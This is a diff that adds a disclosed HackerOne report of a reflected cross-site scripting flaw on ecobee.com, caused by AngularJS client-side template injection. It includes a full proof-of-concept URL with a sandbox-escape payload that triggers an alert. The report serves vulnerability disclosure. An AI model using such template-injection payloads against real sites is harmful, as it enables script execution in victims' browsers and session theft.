@@ -1,0 +1,22 @@
+ReportLink:https://hackerone.com/reports/500518
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/mik317
+ReportedTo:ecobee(ecobee)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:16.06.2019 10:55:26
+
+Summary:
+
+**Summary:**
+Hi EcoBee team,
+the `https://www.ecobee.com` domain is vulnerable against `angular injection via CSTI`, that leads to XSS.
+
+**Steps To Reproduce:**
+  1. Go on https://www.ecobee.com/?s={{x%20=%20{%27y%27:%27%27.constructor.prototype};%20x[%27y%27].charAt=[].join;$eval(%27x=alert(/Mik/)%27);}}
+  1. XSS executed {F429434}
+
+## Impact
+
+`XSS` via `CSTI injection` using `angular`
